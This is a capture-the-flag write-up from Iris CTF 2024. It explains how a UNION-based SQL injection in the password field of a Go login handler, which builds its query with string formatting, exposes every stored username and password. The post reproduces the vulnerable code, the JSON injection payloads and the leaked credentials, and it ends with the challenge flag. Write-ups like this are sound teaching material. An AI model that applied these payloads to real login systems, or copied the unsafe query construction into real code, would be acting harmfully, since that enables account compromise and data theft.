---
layout: writeup
category: Iris-CTF-2024
chall_description: N/A
points: 50
solves: 422
tags: web sqli union
date: 2024-12-7
comments: false
---

[baby] Oh no! Skat forgot their password (again)!  

Can you help them find it?  

[https://whats-my-password-web.chal.irisc.tf/](https://whats-my-password-web.chal.irisc.tf/)  
[whats-my-password.tar.gz](https://github.com/Nightxade/ctf-writeups/blob/master/assets/CTFs/Iris-CTF-2024/whats-my-password.tar.gz)  

---

We're given a source folder for the site, `whats-my-password.tar.gz`. The only relevant part is `setup.sql` and `src/main.go`

Here's `setup.sql`:  

```sql
CREATE DATABASE uwu;
use uwu;

CREATE TABLE IF NOT EXISTS users ( username text, password text );
INSERT INTO users ( username, password ) VALUES ( "root", "IamAvEryC0olRootUsr");
INSERT INTO users ( username, password ) VALUES ( "skat", "fakeflg{fake_flag}");
INSERT INTO users ( username, password ) VALUES ( "coded", "ilovegolang42");

CREATE USER 'readonly_user'@'%' IDENTIFIED BY 'password';
GRANT SELECT ON uwu.users TO 'readonly_user'@'%';
FLUSH PRIVILEGES;
```

With a bit of research on that last part of SQL, I realized that what it was doing was likely just granting the capability of using `SELECT` to the user. So maybe we can do an SQL Union attack?  

Additionaly, it seems like the user `skat` has the flag as his password. Seems like that's our target!  

Now here's the relevant parts of `main.go`:  

```go
matched, err := regexp.MatchString(UsernameRegex, input.Username)
if err != nil {
    w.WriteHeader(http.StatusInternalServerError)
    return
}

if matched {
    w.WriteHeader(http.StatusBadRequest)
    w.Write([]byte("Username can only contain lowercase letters and numbers."))
    return
}

qstring := fmt.Sprintf("SELECT * FROM users WHERE username = \"%s\" AND password = \"%s\"", input.Username, input.Password)
```

Firstly, notice how we can only do SQL injection in the password input. This is because the username can only contain lowercase letters and numbers, making single/double quotes' usage impossible. However, there is no such check on the password. Additionally, take a look at the SQL statement. It is a very standard SQL select statement for login, and now we know we should use double quotes.  

Hence, let's try to construct our query. With Burp Suite's Repeater, we can repeatedly send the JSON POST data. I first sent this:  

```json
{"username":"a","password":"\"union select * from uwu.users-- "}
```

The `--` at the end denotes a comment so the SQL statement will execute properly and essentially ignore everything after our payload. The username is irrelevant, and `a` is merely a placeholder so it doesn't throw an exception for a missing username.  

Unfortunately, this query does not return the output we want!  

```json
{"username":"root","password":"IamAvEryC0olRootUsr"}
```

Hm. Maybe we can try selecting specifically for the `skat` user?  

```json
{"username":"a","password":"\"union select * from uwu.users where username='skat'-- "}
```

And now we get the output we want!  

```json
{"username":"skat","password":"irisctf{my_p422W0RD_1S_SQl1}"}
```

Therefore, the flag is:  

    irisctf{my_p422W0RD_1S_SQl1}